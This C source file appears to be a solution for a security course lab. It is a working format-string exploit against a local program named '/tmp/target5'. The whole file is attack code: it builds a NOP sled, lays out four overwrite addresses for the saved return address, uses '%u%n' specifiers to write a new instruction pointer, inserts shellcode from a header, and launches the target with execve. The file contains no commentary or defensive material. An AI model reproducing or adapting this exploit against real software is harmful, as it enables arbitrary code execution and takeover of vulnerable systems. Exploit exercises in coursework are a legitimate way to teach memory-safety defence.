#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buffer[480];
  
  memset(buffer, 0x90, 480);
  memcpy(buffer,
	"\x9c\xfc\xff\xbf\x01\x01\x01\x01" // ebp + 4, which is eip of foo
	"\x9d\xfc\xff\xbf\x01\x01\x01\x01"
	"\x9e\xfc\xff\xbf\x01\x01\x01\x01"
	"\x9f\xfc\xff\xbf\x01\x01\x01\x01"
	"%08x%08x", 40); // 32 + 16
  memcpy(buffer + 40, "%38u%n%168u%n%257u%n%192u%n", 27); // new eip: 0xbffffe56
  memcpy(buffer + 400, shellcode, 45);

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
